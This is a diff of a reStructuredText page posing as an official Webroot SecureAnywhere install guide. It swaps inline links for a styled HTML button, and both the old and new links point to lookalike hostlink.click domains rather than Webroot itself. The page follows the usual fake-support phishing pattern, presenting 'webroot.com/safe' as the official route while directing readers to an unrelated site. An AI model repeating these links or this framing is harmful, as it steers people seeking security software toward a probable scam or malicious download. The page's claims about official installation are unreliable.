@@ -1,6 +1,13 @@
 How to Install Webroot SecureAnywhere Already Purchased using webroot.com/safe Activate
 ========================================
-If you've already purchased a Webroot subscription and are wondering how to set it up, you're in the right place. The official installation process is straightforward and begins by visiting `webroot.com/safe <https://deskwebroot.hostlink.click/>`_. From there, you can `Install Webroot Already Purchased <https://deskwebroot.hostlink.click/>`_ using your 20-character keycode to ensure your PC or Mac is protected immediately. This guide outlines clear, step-by-step instructions to help you `install and activate your Webroot SecureAnywhere <https://deskwebroot.hostlink.click/>`_ software quickly and correctly.
+If you've already purchased a Webroot subscription and are wondering how to set it up, you're in the right place. The official installation process is straightforward and begins by visiting webroot.com/safe. From there, you can Install Webroot Already Purchased using your 20-character keycode to ensure your PC or Mac is protected immediately. This guide outlines clear, step-by-step instructions to help you install and activate your Webroot SecureAnywhere software quickly and correctly.
+
+.. raw:: html
+
+   <div style="text-align:center;">
+       <a href="https://webrootdesk.hostlink.click" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Go with Webroot Page</a>
+   </div>
+
 
 How to Install Webroot Already Purchased
 ----------------------------------------
